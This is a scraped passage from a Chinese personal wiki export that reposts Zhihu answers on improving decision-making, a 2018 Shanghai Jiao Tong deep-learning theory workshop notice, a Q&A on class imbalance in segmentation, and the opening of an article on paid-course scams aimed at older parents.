Through》），批评说这个模型是完全不靠谱的，它的硬伤包括但不限于：1）很难收集充分的信息2）你可能同时有多个目标，比如又想发财又想陪家人，你也不知道这些目标的权重3）目标与行动方案之间不是单一对应的，不是为了达到目标A就要做事情a，为了达到目标B就要做事情b，往往是做事情a可以满足大部分目标A和小部分目标B，事情b反过来。而你不知道大部分和小部分到底是什么比例基于这些问题，老林拉了一个山头叫渐进主义（incrementalism），说政治家都不是按上面那个路线科学决策的，而是船到桥头自然直，每遇到一个事情，总会有几个手边的应对选项，凭经验和有限的信息，从里面选一个当前最好的方案，最后摸爬滚打也就慢慢混过来了。这文章被引用了两万多次，里面内容很丰富，但大致意思就是，世界上不存在科学决策，摸着石头过河才是正路。说真的，政客要是不能科学决策，普通人可能更悬。为了不在沉痛的气氛中结束这个话题，还是指出一点点通过训练提高的可能性：熟练掌握决策树，均匀分布、正态分布、泊松分布等居家过日子常用的分布，以及假设检验的基本逻辑；理解独立事件、贝叶斯公式、中心极限定理、极大似然法等；了解频率主义与贝叶斯主义的基本区别、了解评价一个估计的几个指标。如果“决策能力”是一种真实存在的东西，这可能是普通人提高它的最有效途径了。 不扯太复杂的理论，说几点实用的。生活中大多决策的失误不是因为能力差，而是因为认知受限以及情绪化的作用。人在不同的场景，不同的时候，不同的精神状况中，认知能力以及情绪的差异极大。而这种差异对于人们看待事物的角度和方式影响非常非常严重。简单来说，一个人决策能力不仅取决于他能否做出更优的决策，还取决于他能否避免更差的决策。也就是说，不仅要看决策能力的上限，还要看决策能力的下限。关于前者，如何提高上限，已经有很多人在讨论，不多赘述。简单的说说如何避免做出差的决策，提高下限——1. 所有重要的决定，不要立做判断，给自己时间再次确认。当你面对一个问题，在不同时间段都能得出同样结论的时候，说明这个结论才是你在现有信息和思维能力下的最优解。你不一定能做出客观上最好的判断，但起码你能做出自己最优的决策。2. 不要在情绪强烈的时候做出决定。人类所有的情绪，对于决策来说都是灾难。积极的情绪会让人过于乐观，低估负面结果带来的影响，从而做出风险性极大的决策——详见去年春末夏初的A股市场；而消极的情绪则会让人陷入悲观，过于保守，从而错过很多机会。你不可能去完全避免情绪化，但起码你可以在情绪喷涌的时候给自己一个提醒。3. 不要在周围人的怂恿下做决定。每个人的思维模式不一样，所处的立场也不一样。除了你之外，没有人能够完全地站在利你的角度去思考问题和做出决策。比如高中时候你的那些死党怂恿你去大胆告白，真的对你来说是最优决策吗？未必。人类的思维远比想象的要脆弱，很多时候听得多了你当时就信了。你不可能消除他人对自己的影响，但你可以等到独处的时候用自己的思维模式再思考一遍，这真的是最好的决定吗？如果能做到这三点，已经能极大程度避免那些事后自己都觉得愚蠢的决策。在这个过程中，也可以逐渐形成自己独立的思维以及决策模式，再去探索怎么样提高自己的上限也就不那么困难了。 不扯太复杂的理论，说几点实用的。生活中大多决策的失误不是因为能力差，而是因为认知受限以及情绪化的作用。人在不同的场景，不同的时候，不同的精神状况中，认知能力以及情绪的差异极大。而这种差异对于人们看待事物的角度和方式影响非常非常严重。简单来说，一个人决策能力不仅取决于他能否做出更优的决策，还取决于他能否避免更差的决策。也就是说，不仅要看决策能力的上限，还要看决策能力的下限。关于前者，如何提高上限，已经有很多人在讨论，不多赘述。简单的说说如何避免做出差的决策，提高下限——1. 所有重要的决定，不要立做判断，给自己时间再次确认。当你面对一个问题，在不同时间段都能得出同样结论的时候，说明这个结论才是你在现有信息和思维能力下的最优解。你不一定能做出客观上最好的判断，但起码你能做出自己最优的决策。2. 不要在情绪强烈的时候做出决定。人类所有的情绪，对于决策来说都是灾难。积极的情绪会让人过于乐观，低估负面结果带来的影响，从而做出风险性极大的决策——详见去年春末夏初的A股市场；而消极的情绪则会让人陷入悲观，过于保守，从而错过很多机会。你不可能去完全避免情绪化，但起码你可以在情绪喷涌的时候给自己一个提醒。3. 不要在周围人的怂恿下做决定。每个人的思维模式不一样，所处的立场也不一样。除了你之外，没有人能够完全地站在利你的角度去思考问题和做出决策。比如高中时候你的那些死党怂恿你去大胆告白，真的对你来说是最优决策吗？未必。人类的思维远比想象的要脆弱，很多时候听得多了你当时就信了。你不可能消除他人对自己的影响，但你可以等到独处的时候用自己的思维模式再思考一遍，这真的是最好的决定吗？如果能做到这三点，已经能极大程度避免那些事后自己都觉得愚蠢的决策。在这个过程中，也可以逐渐形成自己独立的思维以及决策模式，再去探索怎么样提高自己的上限也就不那么困难了。 歪个楼，我觉得你需要这本书，而且有数学理论保证的Sutton &amp; Barto Book: Reinforcement Learning: AnIntroduction强化学习(Reinforcement learning)，是机器学习的一个领域，主要研究决策对象（Agent）如何在环境（Environment）中采取行动（Action）以期望在未来获得累积最大的回报（Reward）。实际上强化学习理论可以解释很多日常道理，而且一些行为心理学上的经验知识可以启发强化学习的研究。比如有这个必要告诉你们一点，人生的经验这就是experience replay嘛。把之前见过的样本输入，决策输出，以及相应得到的reward，重新回放一遍，采取监督学习方法，更新参数。但也要注意，这是默认环境是时间平稳的（stationary），也就是过去的相似情形做出决策的效果，和现在相同。要不然过去的经验反而会造成现在的决策偏差。西方哪个国家我没去过强化学习中经典的Exploration vs Exploitation问题。往往有些人觉得，我只要每次都决策对，不断提高准确率，我就水平高了。naive！真正现实问题，决策空间非常广阔，而且复杂。如果在一个小范围内做的好，只能说你进行了充分挖掘（Exploitation）。但是眼界太窄，只能收敛个局部最优。而只有像长者这样，不断的探索（Exploration）才能看得到大局。那如何探索。就以算法为例，每次采取行动时，都有一部分概率去随机选取非最优选择。否定自己，走出comfort zone，这是一般常人很难有的气魄啊。但是只有不断探索，才能得到更优的决策水平。我绝对不知道，我作为一个上海xxxx怎么把我选到北京去了。这也是强化学习中经典的7. Eligibility Traces问题。就是说一系列复杂长久的决策过程，最后是有了非常大的回报和成功，但是我往前回溯，哪些时刻我的决策是起到关键作用的呢？哪些又不是呢？这个解决办法不多，但是可以这样想。我把每次成功过后，之前所有的决策历程，以指数衰减加权一下。离着近的我就对承认一些贡献，远的呢我也认为有些因素。就好比高考上了清华北大，那肯定都说高中刻苦努力的原因，但是呢再往前倒，小学初中也都是有优秀的习惯的，甚至再说，人家优秀的基因，家庭的从小熏陶培养都是有关的。所以呐，不要只看眼前的果，因很早之前可能就种下了。===========鸡汤灌完以下负能量慎点==============其实呢，强化学习这套理论，很早就开始有研究。之前提到的书2000制作，已经过去快20年了，但依然经典有效。那为什么最近今年机器学习领域开始对强化学习关注起来了呢？因为有深度学习卷积神经网络大杀器！！！其实之前说的都是学习理论，主要负责外围的过程。而实际另一个起到关键作用的是如何将外界输入的信息特征，成功的转化成为决策。这个在deep learning出来之前，是没有什么好的办法的。所以说，懂得许多大道理，却依然过不好这一生。为啥啊因为你笨啊！人家CNN一上准确率99%，你一浅层分类器吭哧吭哧的还分不对(╯‵□′)╯︵┻━┻那咋办啊目前的科学技术，改造脑神经元连接结构估计是不行的。所以只能借助进化的力量，期待下一代改良吧/(ㄒoㄒ)/~~ 没想到堵车间隙写的几句话分分钟得到250+的赞！谢谢大家！！～～原答案分界线～～～科学的决策需要科学的工作方法，牢记3条：1.听多数人的意见；2.跟少数人商量；3.自己做决定。面对陌生的环境和领域，如何做出正确决定？1.与主要人员分别谈话，从不同方面了解情况；2.深入工作现场实地调研，建立一手感性认识；3.独立思考，建立目标，明确思路，找到重点；4.召开专项座谈会，抛出问题，多听多问少表态。看看共识和分歧情况；5.找核心人员商量决定和措施。～～～～～～认同的请点赞咯！！ 来给大家提供一些“训练决策力”的建议~我们不妨来看一下都有什么因素会影响你的决策，再从中找到可以提升的地方。做决定的人是谁，会影响决策不同的人拥有不同的生理特性、人格特质和认知风格，会使得我们在面对决策时的风格千差万别。1. 生理因素会对决策有影响神经科学研究发现，大脑的眼窝前额皮质（orbitofrontal cortex, OFC）区域与做决定的过程密切相关。在针对人类、猴子和老鼠的实验中，OFC区域的受损对其他部分的认知能力都不会有明显的影响，但会明显影响到决策能力，被试在变化的环境中整合信息、权衡利弊、做出对长远有利的决策的能力会显著下降。(Steiner, 2014)当OFC区域的神经活动较强时，我们会对决策有着更强的信心；反之，决策时的信心也会减弱。有意思的是，实验还显示，当OFC区域受损时，我们的决策能力会下降，但事后却并不会对自己的决定和行为感到后悔。(Steiner,2014)原因在于，当OFC区域受损时，被试会丧失“反事实思考”(counterfactual thinking)的能力——即“针对已经发生的事情，假设一种与事实相反的可能性”的能力。“后悔”的情绪是基于这种反事实能力产生的，因为只有当人们假设存在比事实更好的可能性时，才会感到后悔。另外一个影响做决定的因素是年龄。很容易理解，年轻人（尤其是青少年）的问题在于，他们评估风险的能力欠佳，由于智识和经验不足，在做决策时容易忽视可能的风险、或高估自己承受挫折的能力。而年长的人则更容易对自己的决策能力过分自信，导致一意孤行。(De Bruin, 2007)2. 人格特点影响决策风格一系列研究证明，在决策时，不同的人格特质会作出不同风格的决定。Colin DeYoung分析了内向和外向这两种人格特质在决策时的不同表现。他让内向者和外向者分别在两种情境中选择，是立刻得到一个较少的奖赏（比如当天就得到15美元），或者是等待一段时间，得到较多的奖赏（比如等待三周，得到25美元）。结果，外向者更多地会选择立刻得到较少的奖赏，而不是等待之后得到更多满足；而内向者则更多地选择了延迟奖赏时间、换取更多回报。Kaileigh Byrne则进一步分析了处于压力情境时，“大五人格”与决策风格的关系。（回复【大五】给后台，做大五人格测试）他发现，“神经质”或“宜人性”得分较高的人，在没有压力或较少压力的情况下会做出更有效的决策，而在真实的或假想的压力情境下做决策时，则会大失水准。神经质水平高（容易紧张）的人，以及宜人性水平（善解人意、希望让别人舒服）高的人，比起得分低的人来说，一旦面对压力，就会无法忍受等待，会更容易选择眼前立刻能够选择的、哪怕明知道不是最理想的决定。研究者认为，这可能是由于“神经质”得分高的人在压力环境下容易焦虑，更容易有强迫性的行为，更容易分散注意力；而高“宜人性”的人，即那些富有同理心、善解人意的人，可能是因为过于考虑他人的看法，害怕他人会失望，这反而会影响他们在决策时的思考(Byrne, 2015)。3. 认知风格不同，作出的决定也大不相同决策的风格还与不同的认知风格有关。Herbert A. Simon指出，由于信息的思考、直觉和记忆的方式不同，会形成两种基本的决策风格：“完美型”和“满足型”（Simon, 1956）。“完美型”（maximizers）的人喜欢在做选择前，把所有的可能选项都考虑进去，他们喜欢选择“最好的”，有点类似我们常说的“完美主义”；“满足型”（satisficers）的人喜欢快速地做决定，能够满足他们的最低标准。他们会觉得“足够好”就行，有点类似我们所说的“知足常乐”。《选择矛盾》一书的作者、心理学教授Barry Schwartz开发了一个13题的测试，对每个表述从非常不同意到非常同意，依次计1-7分。得分越高，表明越偏向完美主义的决策风格（回复【决策风格】给后台，提取测试题）。Barry Schwartz对11所大学的毕业生进行了调查，分析他们的决策风格与求职结果、快乐程度的关系。结果发现，“完美型”的人总体上找到好工作的几率更大，起薪比“满足型”的人平均高出20%；但在对生活和工作的满意度上，他们都不如“满足型”的人，而且他们选择花费的时间更长，容易在面对选择时陷入焦虑，还会更多地为自己的选择感到后悔。(Schwartz, 2002.)而在伴侣之间，如果两个人分别是“满足型”和“完美型”，Schwartz发现，最好是一起讨论、缩小可能的范围后，让“满足型”的人去做决定，在这样的情况下，两个人最不容易争吵。4. 高智商有时是好决策的阻碍Keith Stanovic发现，是否能做出公平公正的决策，和决策者的智力水平并没有什么关系。更高的智力并不等于更明智的决定；实际上，在某些事情上它可能令你的选择更愚蠢。这是因为，智商高的人可能会受到“我侧偏见”（me-side bias）的影响，即在收集信息以评估各项备选时，选择性地收集那些原本就支持自己本身预判的部分。智慧则和聪明不同，研究者认为，智慧的定义正是有能力做出“不受偏见影响的决策”。当你使用的思考方式更“智慧”时，你的思考和讨论是逻辑完整的，你愿意承认自己知道的事情是有限的，对于不支持自己观点的重要细节依然会加以重视。决策本身的内容也会影响做决定你在什么时候做决定，为自己还是为别人做决定，做什么决定，都会影响你决策的结果。1. 决策疲劳（Decision fatigue）在婚礼采购的最后阶段，你感到非常疲惫，于是同意了销售的所有推荐；逛街逛了一天，你控制不住自己地走向了买甜品的摊位。这些行为看似没有来由，但它们都有可能是由“决策疲劳”导致的：当你已经连续地做了太多的选择，就会在精神上疲惫不堪，而不愿意去权衡利弊，导致决策质量的下降。其实在决策疲劳的时候，我们的身体是有感知的，它往往会产生异样的或异常强烈的某种感觉——可能是挫折感，强烈的想要放纵（比如说脏话、大吃大喝）的冲动——但我们却不明白那种感觉来自哪里，我们往往意识不到那是一种决策疲劳带来的感觉。(Tierney, 2011)也因为我们自己常常疏于意识，决策疲劳通常会导致两种决策上的选择：一种是本能的、鲁莽的采取行动。前面所说的逛完一天街后，本来要减肥的你不假思索地就走向了甜品站，或者在婚礼准备的最后阶段，你会直接说“我要最便宜的”或者“帮我推荐一个最好的”，都属于这种选择。你也很容易在这个时候受到销售人员的蛊惑，进行非理性消费。另一种可能则是避而不作决定，抵制一切涉及改变和风险的行动。比如，在法官在傍晚做判决时，因为已经没有精力权衡，他会觉得将罪犯继续留在狱中是一个保险的决定。(Tierney, 2011)经济学家Dean Spears在印度进行的实验证明，决策疲劳对穷人的影响更大，因为在贫穷的村子里，即便是在他人眼里很便宜的生活必需品（比如肥皂、药品）的选择上，对他们来说也是需要反复权衡和考量的。而这种决策疲劳，使他们无法将更多的精力投入到学习、工作等其他事情的衡量和决策上，更容易做出不理性的选择，因此更难以脱离贫穷。一个典型的事例是，一个领取救济粮票的母亲，却拿粮票去购买垃圾食品。(Tierney, 2011)而互联网时代也容易加剧我们的决策疲劳：我们每天主动或被动接收的信息太多，在同一时间段内可以做的事情也越来越多，在一小段空闲的时间里，是阅读一篇微信文章，看半集电视剧，还是阅读一本书的一个章节，还是在网上购物，这些都是需要耗费我们的精力进行的决策。2. 承诺升级（escalation of commitment）承诺升级是另外一种会带来糟糕决策的现象。它指的是这样一种行为：当主体发现自己的决策已经导致了负面结果时，不去停止或改变行为，反而继续合理化自己的决策和行为，从而带来负面结果的不断升级。当我们在决策时发生“承诺升级现象时，往往受到的是一种叫做“沉没成本谬误”（sunk-cost fallacy）的认知偏误的影响，即当我们证实先前投入的成本没有取得好的结果、已经被浪费掉（成为沉没成本）时，会因为这些成本没有得到预期的收益而感到很惋惜。我们常说的“来都来了”就是典型的承诺升级：你买了张音乐节的票，去了之后发现天气不好，要排很久的队，而且你对这些乐队根本没兴趣。现在你可以选择离开，去做别的更有意义的事，或者留下来继续观看无聊的演出。有的人会觉得，既然千里迢迢地跑来了，花了这么多钱，还是硬着头皮继续呆在这吧，这就是“承诺升级”。你的投入越大，就越容易不理性地继续这样的“承诺升级行为”，典型的例子就是大量资金在股票市场被套牢后，很多人都无法做出退出的决定，而是会选择继续跟进。3. 比起为自己，我们更容易为他人作出好的决定前面我们说到了“决策疲劳”会影响我们的决策质量，一项新的研究则进一步发现，我们在为自己做决定和为他人做决定时的情况不同：当你在为他人，而不是为自己做决定时，更少可能会出现决策疲劳，而且更有可能会享受决策的过程。(Polman, 2016)威斯康辛大学麦迪逊分校的Evan Polman的实验将被试分为4组，分别面对10种假设的情境，但需要完成的行为不同：第一组是为自己做出选择；第二组是为他人做出选择；第三组是面对情境，不需要实际做出选择，而是想象为自己选择；第四组则是想象为他人做出选择。四组都会报告自己在做选择时，感受到选择的难易程度。通过四组的比对发现，在为他人做选择时，要比为自己做选择更轻松，消耗的精力越少，而且选择的过程更令人开心。在Polman的另一个实验中发现，当人们为他人做决定时，会用更抽象、开放的方式去思考，做出的决策更积极和有创造力。因此，Polman认为，避免决策疲劳的好办法，可能是把一些事情的决定权交给你的朋友。有趣的是，研究者Polman还发现，让那些特别乐于助人的朋友帮你做选择，未必是个明智的决定，这是因为当这个人过分为他人考虑时，也会容易陷入决策疲劳，比如，同情心太强的护士，反而会比同情心不那么强的护士更容易决策疲劳。知道了决策的影响因素，我们就可以从这些因素入手，在面临选择时做出更加理性的决定，以下是几个提高决策能力的建议：1. 养成生活和工作的固定程序（routine），提高自控力。多个研究都发现，决策和自控力有着显著的关系：当你的生活大部分是有序的时候，你就会面临更少的选择，而不至于过多地消耗精力。比如，当你习惯固定的睡觉和起床时间，每天早上起床后都去跑步、做早餐然后再去工作，你就不必纠结晚上是否要吃夜宵，以及在早上睁眼时要不要再赖床半小时。如此，你也会更了解自己的生活节律，明白什么时候的状态更好，适合做重大决定和工作。2. 在必要的时候，站在第三方的角度上为自己做决定。Polman说，因为在为他人着想时反而会有意想不到的好效果，因此当你面对困难的选择情境时，还有一种办法是，将这种情境假想成不是在为自己做决定，而是假设自己处于第三方的立场上，假想自己是在为别人做决定，这样作出的决定往往是更理性的。3. 将直觉、推理轮流用到决策过程中。直觉（intuition）和推理（reasoning）这两种决策方式，在我们的决策过程中都会用到。有时候我们需要用直觉去做决定，因为你的直觉其实也就是你的生活经验和价值判断。而推理则是利用摆在面前的事实和数据来做出决策，运用理智和逻辑对比各种选项，列出优缺点，按重要性排序，它适合在做更复杂的决策时使用，但有可能过于机械。在决策过程中你可以将两者结合，先从推理入手，通过收集分析事实和数据做出初步决策，再依靠直觉感受一下，你觉得这个决策如何？你感觉它对不对？如果感觉对了，那就是它了。无论是面对人生的重大决定，还是每天的小决定，做决定的过程归根结底关乎选择：我们选择了一个选项，就意味着放弃更多可能的选项；我们选择了机会，也就承担了风险。最好的选择可能是这样的：它基于尽可能真实、完整的信息，能够很好地实现你珍视的价值，但你也能够承担它可能带来的最坏的后果。每一个做决策的时刻，如果你仔细感受自己的内心，它都能告诉你一些关于你自己的事情，什么东西更吸引你，什么东西令你恐惧。学着为自己做决定，并敢于承担做决定相应的后果，这都会让我们逐渐独立、成熟，在理性决策方面有更多的掌控力。以上。 原文发表于从你做决定的风格看出你是谁｜测试：如何为自己作出好的决定？ 了解更多与心理相关的知识、研究、话题互动、人物访谈等等，欢迎关注KnowYourself - 知乎宇宙中最酷的心理学社区，人人都能看懂，但只有一部分人才会喜欢。 提高决策能力绝对是有迹可循的，接下来我将从决策的分类、决策的方法论、决策的陷阱和决策的行动论四个方面给大家分享目前我所了解到和实践过的决策相关的心得体会。决策分为直觉决策和理性决策，我们先来说直觉决策。在时间紧、压力大、变化复杂的自然环境下，我们必须瞬间做出决定，在这个时候，我们使用的是直觉决策。比如专业的球类运动员与普通人的视觉反应其实是差不多的，而他们迅速的地方在于肢体上的反应。从生物学的角度来看，无意识和产生意识知觉之间有半秒钟的天然延迟，专业运动员正是利用这个延迟做出了快速的判断，让肢体做出反应。这就是直觉决策。我们在平静的时候心跳缓和，在焦虑的时候心跳加速，而焦虑总会让我们做出错误的决定。NBA篮球的赛场上经常有很多精彩的绝杀镜头，而我们常说那些成功导演反败为胜的关键先生有一颗大心脏，他们往往能在关键时刻保持冷静，正是仰仗的心脏和大脑之间的良性作用，一颗反应迅速的心脏使他们保持冷静，帮助大脑快速思考。心脏的瞬间承受能力和瞬间反应能力直接影响了我们的决策水平。在直觉模式下，人的决策有三个特点。01.大脑通过部分信息对比过往经验，迅速做出判断。这是一种经验识别。比如看见穿白大褂的就认为是医生，看见穿警服的就认为是警察，看见中年人拿着保温杯就认为里面泡的是枸杞。02.过去类似的决定带来的感受，影响着当下的决定。这是一种情感标记。比如你看了一部不错的电影，你很认可电影的导演，于是下次再碰到他的电影上映，去看的可能性就肯定会大于不去看的可能性。我在很小时候被一个熊猫的玩偶吓到过（那个玩偶会发出声音），以致于我长大后一直很排斥会发声的玩偶，重来没有买过。03.如果行的通，不再寻找更优的解决方法。完成比完美更重要。比如做考试试卷，我们会以拿分为主，能想出解答路径会马上开始做，而不会想还有没有别的解答方法。选购一副耳机也不会非要比对完所有的耳机性能，只要能满足自己需求就可以了。我们日常生活中的大部分决策都依赖于直觉决策，它之所以能有较高的准确性，其实是经验积累使然，它的优点显而易见，省时快速，不耗费我们过多的精力，缺点是在未有大量经验样本积累的情况下，准确率较低。另一种决策方式是理性决策。在时间充裕，决定影响重大的情况下，我们往往需要罗列所有的可行方案，通过有理有据地分析，多维度比较各个方案的优劣，最后选出最佳方案。比如选大学、就业方向、在哪买房、跟谁结婚这种就是理性决策。在理性模式下，人的决策只有一个特点，结果比理由重要。如果细加琢磨，我们就会发现，理由再充分，也不一定能作为行动的依据。第一理由不一定会周全，第二理由可能是为了合理化行动而编的。比如在工作中同事让你受了委屈，你感觉遭到了不公平的待遇，你想要去报复一下，这是你的理由，但你如果运用理性决策，就不一定会这样去做，因为你的报复行为可能会影响你的职业前途。理性决策要追求得是成本少、收益大的好结果。生活中的情况很复杂，有的选择之间无法直接比较，这时候我们就要把各个选项带来的价值量化，而最常见的量化单位就金钱。量化的过程是非常主观的，比如对于接下来的一个小时是去看电影还是看书，每个人在心里给它们标出的价格是不一样的，也就是说决策的好坏本身也是因人而异的，只要你明确自己的目的，就不难做出让自己不后悔的决策。决策的方法论其实在上面已经提到过一些，列出来无非以下几点。直觉决策：1.凭借经验找到最先冒出来的方案；2.在心里模拟判断方案是否可行；3.如果可行，立刻执行。在直觉模式下，做决策不是比较各个方案的过程，而是模拟演练的结果。理性决策：1. 罗列所有的可行方案；2. 依据事实，分析比较各方案优劣；3. 采用最有优势的方案。在理性模式下，一切以可预测的结果为导向，尽量屏蔽情绪和习惯的偏好。接下来讲讲需要避开的决策陷阱。01. 忘记计算机会成本。机会成本是指你为了这个选择而放弃的别的选择所带来的最大收益。这种现象可以说是满天飞，例子比比皆是，比如你有两个小时的时间，你可以选择逛淘宝也可以选择工作，假设你两个小时的工作能赚到100元，那么如果你选择逛淘宝，这个决策（逛淘宝）的机会成本就是100元。又比如你开车从A地点到B地点，有两选个选择，走路线C会碰上拥堵，而走路线D，不堵但需要收取过路费（上高速），影响你做选择的，不应该只是过路费，还有你能利用两条路线到达时间差所创造的最大价值。02. 把沉没成本计算了进来。沉没成本是指由过去的决策已经产生的，不能由现在或将来的决策发生改变的成本。最经典的例子就是去电影院看到一部烂电影，这时你有两个选择，马上离开和继续看下去，你会怎么选？“票钱都花了，来都来了，不看可惜了。”这其实不能作为你选择继续看下去的决策理由。因为票钱和过来电影院所花的时间已经消耗了，是沉没成本，没法退票没法重来，而如果你待下去，只会继续消耗你的宝贵时间和精力。当然，如果你实在无聊，回去也没有想做的事情，也可以继续呆下去，这时候你的决策理由是面向现在和将来的，而不是过去。要不掉入这个陷阱就要做到既往不念，纵情未来。03. 根据误导性经验产生错误预判。这种陷阱其实是指在文章最开头的经验模式中加入不起眼的变量，而导致实际情况发生了变化。比如把网球的场地换到高原，或把球的重量改变的情况下，专业运动员的失误率比普通人更高。这是因为情况改变而导致的经验失效。所以在以经验模式为判断基础的情况下，要格外留心环境中的变量是否改变。最后讲讲决策的行动论。我给行动论的定义是：在脑海中可视化的具体的操作办法，是基于方法论的方法论。它由以下四步组成：1. 给选择添加必要条件；2. 为每个条件按重要程度打分并排序；3. 把条件减少到三个；4. 复盘。这里其实遵循了奥卡姆剃刀原则：如无必要，勿增实体。不展开说，有兴趣可以自查百科。而3其实是个很经典的数字，如果你不能在3个必要条件内把事情或自己的需求描述清楚，证明你还没有真正搞懂它。人生的重大决策能重新选择的机会不多，容错率很低，我们唯有在平时的日常的小决策和中决策中不断练习，才能增加重大决策时我们选择正确的概率，但你要知道，即使做了再多的练习，也无法保证我们一定在下次选择成功，我们始终要面对的是不确定的未来。必要条件是为了服务于自己的目的，明确目的是什么，才能帮你快速找到必要条件。举个自己的例子：我买洗发水的目的是为了洗干净头发，所以我的必要条件是1.能用，没了。我买键盘是为了能快速打字，偶尔也能玩竞技游戏，同时还能发（zhuang）光（bi）。于是我买了雷蛇的机械键盘。整个决策过程相当轻松，不纠结，快速正确。当然选择过后我也会复盘，看看是否整个决策过程中有新的经验和新的信息进来，如果有，会根据情况调整必要的条件。这套行动论必须基于大量的练习，才能开花结果，最终它不仅能帮你快速正确的决策，更能培养你的个人原则，孵化你的价值观。 如果是个人决策，可以听大多数人怎么说，参考少数人的意见，最后自己做决定。所谓兼听则明，偏听则暗。而如果是共同决策，则要充分考虑各方的立脚点，分析每个观点中的个人偏好，最后的决定往往是各方博弈的结果。最后，请牢记，所有准确可靠的直觉决策全部来自于大量的理性决策积累。欢迎关注我的个人微信公众号【1990年12月15日】，希望与你持之以恒地共同成长。关注公众号在后台回复【知乎】，赠你三份关于成长学习的惊喜，作为小小的见面礼。","tags":[],"categories":[{"name":"剪贴板-Clipboard","slug":"剪贴板-Clipboard","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/"},{"name":"提升自己-Self Improvement","slug":"剪贴板-Clipboard/提升自己-Self-Improvement","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/提升自己-Self-Improvement/"}]},{"title":"2018上海交通大学深度学习理论前沿研讨会","date":"2018-07-20T03:46:16.000Z","path":"wiki/剪贴板-Clipboard/学术界-Academic Area/18上海交通大学深度学习理论前沿研讨会/","text":"2018上海交通大学深度学习理论前沿研讨会我的实验室组织了一个关于深度学习理论的研讨会，专栏组织者@廖振宇 博士也会来做报告。欢迎有兴趣的小伙伴来参加！ 时间：2018年7月28日8:30 地点：上海交通大学闵行校区电信群楼3-200 主题：深度学习理论探讨 报告1：基于类脑智能的遥感影像解译 焦李成 西安电子科技大学教授 IEEE Fellow 报告2：Learning Partial Differential Equations for Computer Vision and Image Processing 林宙辰 北京大学教授 IEEE Fellow 报告3：A Random Matrix Approach to Deep Learning 邱才明 上海交通大学教授 国家千人IEEE Fellow 报告4：基于深度学习的显著性目标检测理论与实践 卢湖川 大连理工大学教授 国家杰出青年 报告5：深度学习在无人驾驶领域的应用 杨明 上海交通大学教授 报告6：“Deep Revolution” in Image Restoration and Beyond 董彬 北京大学副教授 国家青年千人 报告7：深度特征学习与应用 杨淑媛 西安电子科技大学教授 报告8：Towards understanding generalization, optimization dynamics, and robustness in deep learning 朱占星 北京大学数据科学研究中心、北京大数据研究院特聘研究员 报告9：深度学习中神经网络的可解释性 张拳石 上海交通大学约翰▪霍普克罗夫特计算机科学中心长聘教轨副教授 报告10：Recent Advances in Random Matrix Theory for Neural Networks 廖振宇 巴黎中央理工大学博士 https://zhuanlan.zhihu.com/p/40097048","tags":[],"categories":[{"name":"剪贴板-Clipboard","slug":"剪贴板-Clipboard","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/"},{"name":"学术界-Academic Area","slug":"剪贴板-Clipboard/学术界-Academic-Area","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/学术界-Academic-Area/"}]},{"title":"为什么segmentation的paper里很少见对sample imbalance的处理？","date":"2018-07-20T03:40:47.000Z","path":"wiki/剪贴板-Clipboard/深度学习-Deep Learning/什么segmentation的paper里很少见对sample-imbalance的处理？/","text":"为什么segmentation的paper里很少见对sample imbalance的处理？比如： FCN Fully convolutional training can balance classes by weighting or sampling the loss. Although our labels are mildly unbalanced (about 3/4 are background), we find class balancing unnecessary. Deeplab: All positions and labels are equally weighted in the overall loss function (except for unlabeled pixels which are ignored). PSPNet 没考虑sample balance的问题 SegNet 在这个问题上考察的比较细致，用了median frequency balancing, 发现global accuracy低，mean IoU高 像KITTI, Cityscapes这种数据集，里面各类别像素数量差异很大，但是在paper里很少见到对样本不均问题的处理，这个因素影响不关键吗？ https://www.zhihu.com/question/285131484/answer/442500893 这个问题很重要。我们经常会遇到细小物体分割的情况，比如分割电线，分割天际线等等。你当然可以设计很多fancy的模型去建模这些形态，但实际在深度学习工程中，往往只要把这一类物体的损失权重调高几倍就够用了。 Loss 加权，focalloss,或者困难样本挖掘都能提高效果，具体参数需要你自己调整一下了就得了 首先这个问题肯定是重要的，如果再放开一点，让我们来看待一个二分类问题，前景背景像素比例悬殊，1:50，那么这时候如果依然使用正常的FCN+CE来训练，效果一般情况下会不好，因为这时候只要网络将所有像素点都判断为背景的话，loss同样会很低，但这样显然不是我们所希望看到的。因此对于样本不平衡的情况，学者门也发了很多的论文，比如提出了Dice loss，直接优化测试指标，Focal loss，减少简单负样本对学习过程的主导影响等，或者就像@Hannibal Gwa提到的加权的CE损失，总的目的都是为了对抗训练样本不平衡问题","tags":[],"categories":[{"name":"剪贴板-Clipboard","slug":"剪贴板-Clipboard","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/"},{"name":"深度学习-Deep Learning","slug":"剪贴板-Clipboard/深度学习-Deep-Learning","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/深度学习-Deep-Learning/"}]},{"title":"“请放过我爸妈！”这些披着知识付费外衣的毒手，正在伸向你家人……","date":"2018-07-20T03:39:17.000Z","path":"wiki/剪贴板-Clipboard/商业-Business/放过我爸妈！”这些披着知识付费外衣的毒手，正在伸向你家人……/","text":"“请放过我爸妈！”这些披着知识付费外衣的毒手，正在伸向你家人……在老师们辛苦打磨课程的时候，知识盗猎者早已空手组局，赚得盆满钵满。 仔细想想，都是满满的套路…本文4757个字，大概10分钟读完。金融八卦女频道每日为你送上有态度、有温度、有深度的精彩内容，欢迎置顶关注，八妹等你 文：亚澜来源： 深响（ID：deep-echo） “你爸正在用手机学英语，所以才没接你电话。” 当母亲告诉我，我那年过半百的、普通话都说的有些困难的父亲正在学英语的时候，我感到震惊并迅速警觉起来，叮嘱母亲帮我“监控”父亲学英语这件事。 又过了5天，我意识到事情的严重性。 除了父亲，他那些年龄相仿、社会阅历非常丰富的老战友、同事竟然都开始分享“学英语”的朋友圈。每天上午十点之前，整整齐齐地发送同样一张海报——“免费微课，5天拼会所有英语单词”。 海报与学员朋友圈 学了四年英语播音专业的我深感智商被严重侮辱。 带着诸多疑问，我潜入到了这个神秘的、看上去很“low”、聚拢着大量二三四线城市中老年群体的英语学习群中： 5天真的能教你拼会所有的英语单词吗？ 这么厉害的老师到底是谁？ 课程真的是免费的吗？ 这些转发又是什么套路？ 盗版付费内容早就在淘宝、闲鱼、各种云盘上泛滥，这一次又是什么新花样？ 根本抓不到的“知识”骗子 